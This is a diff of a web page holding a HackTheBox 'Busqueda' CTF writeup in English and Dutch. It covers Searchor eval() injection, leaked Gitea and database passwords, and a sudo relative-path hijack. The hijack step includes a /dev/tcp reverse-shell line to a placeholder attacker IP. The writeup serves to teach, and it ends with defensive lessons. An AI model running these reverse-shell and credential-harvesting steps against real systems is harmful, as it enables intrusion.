@@ -4,16 +4,25 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Busqueda — HackTheBox CTF Writeup | CyberStefan</title>
-  <meta name="description" content="Busqueda HTB writeup — Easy HackTheBox machine. Python eval() code injection via Searchor 2.4.0 + sudo Git config privilege escalation. Door CyberStefan.">
+  <meta name="description" content="HackTheBox — Busqueda (Easy) Writeup Recon An initial Nmap scan of the target revealed two open ports: Port State Service 22 open OpenSSH 8.9p1 Ubuntu 80…">
   <meta property="og:type" content="article">
   <meta property="og:site_name" content="CyberStefan">
-  <meta property="og:title" content="Busqueda HackTheBox CTF Writeup — CyberStefan">
-  <meta property="og:description" content="Busqueda HTB writeup — Easy machine. Python eval() code injection via Searchor 2.4.0 + sudo Git config privilege escalation.">
+  <meta property="og:title" content="Busqueda CTF Writeup — CyberStefan">
+  <meta property="og:description" content="HackTheBox — Busqueda (Easy) Writeup Recon An initial Nmap scan of the target revealed two open ports: Port State Service 22 open OpenSSH 8.9p1 Ubuntu 80…">
   <meta property="og:url" content="https://cyberstefan.nl/writeup/busqueda/">
+  <meta property="og:image" content="https://cyberstefan.nl/assets/cyberstefan-icon.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Busqueda CTF Writeup — CyberStefan">
+  <meta name="twitter:description" content="HackTheBox — Busqueda (Easy) Writeup Recon An initial Nmap scan of the target revealed two open ports: Port State Service 22 open OpenSSH 8.9p1 Ubuntu 80…">
+  <meta name="twitter:image" content="https://cyberstefan.nl/assets/cyberstefan-icon.png">
   <link rel="canonical" href="https://cyberstefan.nl/writeup/busqueda/">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="192x192" href="/favicon.png">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/assets/style.css">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Busqueda — HackTheBox CTF Writeup", "description": "HackTheBox — Busqueda (Easy) Writeup Recon An initial Nmap scan of the target revealed two open ports: Port State Service 22 open OpenSSH 8.9p1 Ubuntu 80…", "author": {"@type": "Person", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "publisher": {"@type": "Organization", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "datePublished": "2026-04-04", "dateModified": "2026-04-04", "keywords": "RCE, Web, Enumeration, Privesc, Linux, HackTheBox, Easy, CTF, writeup, ethical hacking", "articleSection": "CTF Writeup", "url": "https://cyberstefan.nl/writeup/busqueda/", "inLanguage": ["en", "nl"], "image": "https://cyberstefan.nl/assets/cyberstefan-icon.png"}</script>
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "Home", "item": "https://cyberstefan.nl/"}, {"@type": "ListItem", "position": 2, "name": "Busqueda Writeup", "item": "https://cyberstefan.nl/writeup/busqueda/"}]}</script>
 </head>
 <body>
 
@@ -32,44 +41,153 @@
         </svg>
         CTF Writeups
       </a>
+      <a href="/blog" style="color:var(--text-muted,#8b949e);font-size:.85rem;text-decoration:none;transition:color .15s" onmouseover="this.style.color='#e6edf3'" onmouseout="this.style.color='#8b949e'">Blog</a>
+      <a href="/resources/" style="color:var(--text-muted,#8b949e);font-size:.85rem;text-decoration:none;transition:color .15s" onmouseover="this.style.color='#e6edf3'" onmouseout="this.style.color='#8b949e'">Resources</a>
     </div>
     <div style="display:flex;align-items:center;gap:16px">
-    <div class="lang-flags-header">
-      <button class="lang-flag-btn" data-lang="nl" title="Nederlands">
-        <svg class="flag-svg-sm" viewBox="0 0 900 600">
-          <rect width="900" height="600" fill="#21468B"/>
-          <rect width="900" height="400" fill="#fff"/>
-          <rect width="900" height="200" fill="#AE1C28"/>
-        </svg>
-        <span class="lang-switch-code">NL</span>
-      </button>
-      <button class="lang-flag-btn" data-lang="en" title="English">
-        <svg class="flag-svg-sm" viewBox="0 0 60 30">
-          <rect width="60" height="30" fill="#012169"/>
-          <path d="M0,0 L60,30 M60,0 L0,30" stroke="#fff" stroke-width="6"/>
-          <path d="M0,0 L60,30 M60,0 L0,30" stroke="#C8102E" stroke-width="4"/>
-          <path d="M30,0 V30 M0,15 H60" stroke="#fff" stroke-width="10"/>
-          <path d="M30,0 V30 M0,15 H60" stroke="#C8102E" stroke-width="6"/>
-        </svg>
-        <span class="lang-switch-code">EN</span>
-      </button>
-    </div>
+      <div class="lang-flags-header">
+        <button class="lang-flag-btn" data-lang="nl" title="Nederlands">
+          <svg class="flag-svg-sm" viewBox="0 0 900 600"><rect width="900" height="600" fill="#21468B"/><rect width="900" height="400" fill="#fff"/><rect width="900" height="200" fill="#AE1C28"/></svg>
+          <span class="lang-switch-code">NL</span>
+        </button>
+        <button class="lang-flag-btn" data-lang="en" title="English">
+          <svg class="flag-svg-sm" viewBox="0 0 60 30"><rect width="60" height="30" fill="#012169"/><path d="M0,0 L60,30 M60,0 L0,30" stroke="#fff" stroke-width="6"/><path d="M0,0 L60,30 M60,0 L0,30" stroke="#C8102E" stroke-width="4"/><path d="M30,0 V30 M0,15 H60" stroke="#fff" stroke-width="10"/><path d="M30,0 V30 M0,15 H60" stroke="#C8102E" stroke-width="6"/></svg>
+          <span class="lang-switch-code">EN</span>
+        </button>
+      </div>
     </div>
   </div>
 </header>
 
-<main class="container" id="root">
-  <div class="loading">
-    <div class="spinner"></div>
-    <span id="loading-text">Loading...</span>
+<main class="container">
+  <a href="/" class="back-link">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+    <span class="lang-en">All writeups</span><span class="lang-nl" hidden>Alle writeups</span>
+  </a>
+
+  <div class="writeup-header">
+    <h1 class="writeup-title">Busqueda</h1>
+    <div class="writeup-meta">
+      <span class="badge badge-difficulty-Easy">Easy</span>
+      <span class="badge badge-platform-HackTheBox">HackTheBox</span>
+      <span class="badge" style="color:var(--muted);border-color:var(--border)">Completed</span>
+    </div>
+    <div class="writeup-tags"><span class="badge badge-tag">RCE</span><span class="badge badge-tag">Web</span><span class="badge badge-tag">Enumeration</span><span class="badge badge-tag">Privesc</span><span class="badge badge-tag">Linux</span></div>
+    <p class="writeup-date" style="margin-top:10px">
+      <span class="lang-en">4 April 2026</span>
+      <span class="lang-nl" hidden>4 april 2026</span>
+    </p>
+  </div>
+
+  <div class="writeup-body lang-en"><h2>HackTheBox — Busqueda (Easy) Writeup</h2>
+<h2>Recon</h2>
+<p>An initial Nmap scan of the target revealed two open ports:</p>
+<pre><code>nmap -sC -sV -p- -oN busqueda_full.nmap &lt;target_ip&gt;</code></pre>
+<p>| Port | State | Service |<br>|------|-------|---------|<br>| 22   | open  | OpenSSH 8.9p1 Ubuntu |<br>| 80   | open  | Apache 2.4.52 HTTP |</p>
+<p>The server responded as <code>searcher.htb</code> and redirected to <code>http://searcher.htb/</code>. The website footer revealed the application was running on <strong>Flask</strong> and <strong>Searchor 2.4.0</strong>. A quick search confirmed that Searchor 2.4.0 is vulnerable to Python code injection via <code>eval()</code> in the <code>engine</code> parameter.</p>
+<h2>Exploitation</h2>
+<h3>Python Code Injection via Searchor 2.4.0</h3>
+<p>Searchor 2.4.0 processes search queries using <code>eval()</code> without proper input sanitization. By injecting a malicious value into the <code>engine</code> parameter, arbitrary Python commands can be executed on the server.</p>
+<p>A reverse shell payload was crafted and sent via Burp Suite — the <code>engine</code> parameter contained a Python reverse shell using <code>socket</code> and <code>subprocess</code>. The server responded with HTTP 200, and the browser was redirected to AccuWeather, confirming that <code>eval()</code> executed the payload.</p>
+<pre><code># Netcat listener
+nc -lvnp 13337</code></pre>
+<p><strong>Result:</strong> A reverse shell as user <strong><code>svc</code></strong> inside <code>/var/www/app</code>.</p>
+<h2>Privilege Escalation</h2>
+<h3>Step 1 — Credentials in .git/config</h3>
+<p>Inside <code>/var/www/app/.git/config</code>, the Gitea remote URL contained plaintext credentials:</p>
+<pre><code>http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</code></pre>
+<p>Gitea was running internally on <code>gitea.searcher.htb:3000</code> (version 1.18.0+rc1). The <code>cody</code> password also worked for the <code>administrator</code> account, granting access to private repositories.</p>
+<h3>Step 2 — Sudo Misconfiguration</h3>
+<pre><code>svc@busqueda:~$ sudo -l
+User svc may run the following commands on busqueda:
+    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/system-checkup.py *</code></pre>
+<h3>Step 3 — Docker Inspect Credential Leak</h3>
+<p>The <code>system-checkup.py</code> script accepted three subcommands: <code>docker-ps</code>, <code>docker-inspect</code>, and <code>full-checkup</code>. Running <code>docker-ps</code> showed two containers: <code>gitea</code> (port 3000) and <code>mysql_db</code> (port 3306).</p>
+<p>Using <code>docker-inspect</code> with a Go template leaked the Gitea container environment variables:</p>
+<pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &#x27;{{json .}}&#x27; gitea | jq</code></pre>
+<p>This revealed <code>GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh</code>, which gave access to the Gitea <code>administrator</code> account and the private repository containing the <code>system-checkup.py</code> source code.</p>
+<h3>Step 4 — Relative Path Exploitation</h3>
+<p>Reading the source code revealed that <code>full-checkup</code> executed <code>./full-checkup.sh</code> using a <strong>relative path</strong> from the current working directory — no absolute path was specified.</p>
+<pre><code>cd /tmp
+echo &#x27;#!/bin/bash&#x27; &gt; full-checkup.sh
+echo &#x27;bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/9001 0&gt;&amp;1&#x27; &gt;&gt; full-checkup.sh
+chmod +x full-checkup.sh
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</code></pre>
+<p><strong>Result:</strong> A root shell.</p>
+<h2>Lessons Learned</h2>
+<p>1. <strong>Never use <code>eval()</code> with user input:</strong> Searchor 2.4.0 passed unsanitized input directly to <code>eval()</code>, enabling full remote code execution. Any user-controlled data must be strictly validated before evaluation.</p>
+<p>2. <strong>Credentials in version control:</strong> Storing credentials in <code>.git/config</code> remote URLs is a critical mistake. These files are readable by anyone with filesystem access and persist in git history even after removal.</p>
+<p>3. <strong>Password reuse is dangerous:</strong> The <code>cody</code> password also worked for the <code>administrator</code> account. Unique, strong passwords per service are essential.</p>
+<p>4. <strong>Relative paths in sudo scripts:</strong> Using <code>./script.sh</code> instead of an absolute path in a script run with <code>sudo</code> allows any user with write access to the CWD to hijack execution. Always use absolute paths in privileged scripts.</p>
+<p>5. <strong>Docker inspect as an information leak:</strong> Container environment variables often contain database passwords and API keys. Granting access to <code>docker-inspect</code> via sudo is equivalent to handing out those secrets.</p></div>
+  <div class="writeup-body lang-nl" hidden><h2>HackTheBox — Busqueda (Easy) Writeup</h2>
+<h2>Verkenning</h2>
+<p>Een initiële Nmap-scan van het doelwit onthulde twee open poorten:</p>
+<p>| Poort | Status | Dienst |<br>|-------|--------|--------|<br>| 22    | open   | OpenSSH 8.9p1 Ubuntu |<br>| 80    | open   | Apache 2.4.52 HTTP |</p>
+<p>De server reageerde als <code>searcher.htb</code> en stuurde door naar <code>http://searcher.htb/</code>. De website-footer onthulde dat de applicatie draaide op <strong>Flask</strong> en <strong>Searchor 2.4.0</strong>. Searchor 2.4.0 is kwetsbaar voor Python code-injectie via <code>eval()</code> in de <code>engine</code>-parameter.</p>
+<h2>Uitbuiting</h2>
+<h3>Python Code-injectie via Searchor 2.4.0</h3>
+<p>Searchor 2.4.0 verwerkt zoekopdrachten met <code>eval()</code> zonder invoervalidatie. Door een kwaadaardige waarde in de <code>engine</code>-parameter te injecteren, kunnen willekeurige Python-commando&#x27;s worden uitgevoerd.</p>
+<p>Een reverse shell payload werd verstuurd via Burp Suite. De server reageerde met HTTP 200 en de browser werd doorgestuurd naar AccuWeather — bewijs dat <code>eval()</code> de payload uitvoerde.</p>
+<p><strong>Resultaat:</strong> Een reverse shell als gebruiker <strong><code>svc</code></strong> in <code>/var/www/app</code>.</p>
+<h2>Privilege Escalation</h2>
+<h3>Stap 1 — Credentials in .git/config</h3>
+<p>In <code>/var/www/app/.git/config</code> stond de Gitea remote URL met plaintext credentials:<br><code>http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb</code></p>
+<p>Het wachtwoord van <code>cody</code> werkte ook voor het <code>administrator</code>-account in Gitea.</p>
+<h3>Stap 2 — Sudo misconfiguratie</h3>
+<p>Gebruiker <code>svc</code> mocht <code>/usr/bin/python3 /opt/scripts/system-checkup.py *</code> uitvoeren als root zonder wachtwoord.</p>
+<h3>Stap 3 — Docker Inspect lekt credentials</h3>
+<p><code>docker-inspect &#x27;{{json .}}&#x27; gitea | jq</code> toonde de omgevingsvariabelen van de Gitea-container, inclusief <code>GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh</code>. Met dit wachtwoord werd toegang verkregen tot de private repository met de broncode van <code>system-checkup.py</code>.</p>
+<h3>Stap 4 — Relatief pad exploitatie</h3>
+<p>De broncode toonde dat <code>full-checkup</code> het script <code>./full-checkup.sh</code> uitvoerde via een <strong>relatief pad</strong>. Door een kwaadaardig script met dezelfde naam in <code>/tmp</code> te plaatsen en het commando vanuit die map uit te voeren, werd een root-shell verkregen.</p>
+<h2>Geleerde lessen</h2>
+<p>1. Gebruik nooit <code>eval()</code> met gebruikersinvoer — dit leidt direct tot RCE.<br>2. Sla geen credentials op in <code>.git/config</code> of andere versiebeheerbestanden.<br>3. Gebruik geen relatieve paden in scripts die met sudo worden uitgevoerd.<br>4. Docker inspect via sudo geeft toegang tot alle containergeheimen.</p></div>
+
+  <div style="margin-top:32px;padding:18px 20px;background:#161b22;border:1px solid #30363d;border-radius:10px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap">
+    <span class="lang-en" style="font-size:.9rem;color:#cdd9e5">Want to try this CTF challenge yourself?</span>
+    <span class="lang-nl" hidden style="font-size:.9rem;color:#cdd9e5">Wil je deze CTF ook proberen?</span>
+    <a href="https://hacktheboxltd.sjv.io/enroEz" target="_blank" rel="noopener sponsored" style="display:inline-flex;align-items:center;gap:6px;background:#58a6ff;color:#0d1117;font-size:.82rem;font-weight:600;padding:8px 16px;border-radius:6px;text-decoration:none;white-space:nowrap">
+      <span class="lang-en">Click here</span><span class="lang-nl" hidden>Ga dan hier naartoe</span>
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+    </a>
+  </div>
+
+  <div style="margin-top:12px;padding:14px 18px;background:#0d1117;border:1px solid #21262d;border-radius:8px;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap">
+    <span class="lang-en" style="font-size:.82rem;color:#6e7681">🔒 Protect your IP while hacking — use a VPN</span>
+    <span class="lang-nl" hidden style="font-size:.82rem;color:#6e7681">🔒 Bescherm je IP tijdens het hacken — gebruik een VPN</span>
+    <a href="https://go.nordvpn.net/aff_c?offer_id=15&amp;aff_id=146180&amp;url_id=902" target="_blank" rel="noopener sponsored" style="font-size:.78rem;color:#58a6ff;text-decoration:none;white-space:nowrap;flex-shrink:0">NordVPN →</a>
   </div>
 </main>
 
 <footer>
-  <div class="container" id="footer-text"></div>
+  <div class="container" id="footer-text">
+    <span class="lang-en">Built with FastAPI &amp; SQLite &mdash; automated via <code>ctf-writeup</code> CLI</span>
+    <span class="lang-nl" hidden>Gebouwd met FastAPI &amp; SQLite &mdash; geautomatiseerd via <code>ctf-writeup</code> CLI</span>
+  </div>
 </footer>
 
-<script>window._WRITEUP_ID = 3;</script>
-<script src="/assets/writeup.js"></script>
+<script>
+(function () {
+  var l = localStorage.getItem('lang') || 'en';
+  document.documentElement.lang = l;
+  if (l === 'nl') {
+    document.querySelectorAll('.lang-en').forEach(function(e){e.hidden=true;});
+    document.querySelectorAll('.lang-nl').forEach(function(e){e.hidden=false;});
+  }
+  document.querySelectorAll('.lang-flag-btn').forEach(function(btn){
+    btn.classList.toggle('active', btn.dataset.lang === l);
+    btn.addEventListener('click', function(){
+      var nl = btn.dataset.lang;
+      localStorage.setItem('lang', nl);
+      document.documentElement.lang = nl;
+      document.querySelectorAll('.lang-flag-btn').forEach(function(b){
+        b.classList.toggle('active', b.dataset.lang === nl);
+      });
+      document.querySelectorAll('.lang-en').forEach(function(e){e.hidden=(nl!=='en');});
+      document.querySelectorAll('.lang-nl').forEach(function(e){e.hidden=(nl!=='nl');});
+    });
+  });
+})();
+</script>
 </body>
 </html>
